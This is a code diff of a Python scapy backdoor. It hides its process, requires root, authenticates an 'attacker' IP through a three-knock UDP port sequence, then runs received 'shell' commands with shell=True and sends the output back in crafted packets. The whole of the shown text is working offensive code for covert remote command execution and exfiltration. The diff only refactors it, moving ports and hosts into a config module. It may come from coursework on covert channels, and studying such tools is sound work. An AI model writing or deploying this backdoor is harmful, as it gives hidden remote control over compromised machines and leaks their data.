@@ -14,37 +14,39 @@ import config
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 code = 0
 attackerIP = ""
-attackerPort = 8505
+
 
 def portKnocking(packet):
     global code
     global attackerIP
-    portKnocks = config.portKnocks
+    ports = config.portKnocks
     if IP in packet:
         if UDP in packet:
             srcAddr = packet[IP].src
             srcPort = packet[UDP].sport
-            if srcPort == portKnocks[0] and code == 0:
+            if srcPort == ports[0] and code == 0:
                 code = 1
                 print("{} : Knock 1".format(srcAddr))
-            elif srcPort == portKnocks[1] and code == 1:
+            elif srcPort == ports[1] and code == 1:
                 code = 2
                 print("{} : Knock 2".format(srcAddr))
-            elif srcPort == portKnocks[2] and code == 2:
+            elif srcPort == ports[2] and code == 2:
                 code = 3
                 attackerIP = srcAddr
                 print("{}: Knock 3. Authetication succeed.".format(srcAddr))
             else:
-                print("Authetication failed (code = 0)")
-def craftPacket(ip, port, data):
-    packet = IP(dst=ip)/TCP(dport=port)/Raw(load=data)
+                print("Authetication failed. Wrong sequence...")
+
+def craftPacket(data):
+    packet = IP(src=config.localIP, dst=config.remoteIP)/UDP(sport=config.localPort, dport=config.remotePort)/Raw(load=data)
     return packet
 
 def executeCmd(packet, cmd):
     print("Executing command: {}".format(cmd))
     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result = result.stdout.read() + result.stderr.read()
-    packet = craftPacket(attackerIP, attackerPort, result)
+    print("Result: %s" % result)
+    packet = craftPacket(result)
     send(packet)
     time.sleep(0.1)
 
@@ -54,15 +56,16 @@ def parsePacket(packet):
         if packet[IP].src != attackerIP:
             return
         payload = packet['Raw'].load
+        payload = payload.decode("utf8")
         cmdType, cmdString = payload.split(' ')
         if cmdType == "shell":
             executeCmd(packet, cmdString)
+            sys.exit(0)
         elif cmdType == "exit":
             print("Backdoor exited.")
             sys.exit(0)
         else:
             print("Incorrected command")
-
 
 def checkRootPrivilege():
     if os.getuid() != 0:
@@ -79,10 +82,9 @@ def main():
     maskProcess()
     checkRootPrivilege()
     while code != 3:
-        sniff(filter="udp and dst port 8005", prn=portKnocking, count=1)
+        sniff(filter="udp and dst port {}".format(config.listenPort), prn=portKnocking, count=1)
     while True:
-        sniff(filter="tcp and dst port 8505", prn=parsePacket, count=1)
-
+        sniff(filter="tcp and dst port {}".format(config.localPort), prn=parsePacket, count=1)
 
 if __name__ == '__main__':
     main()
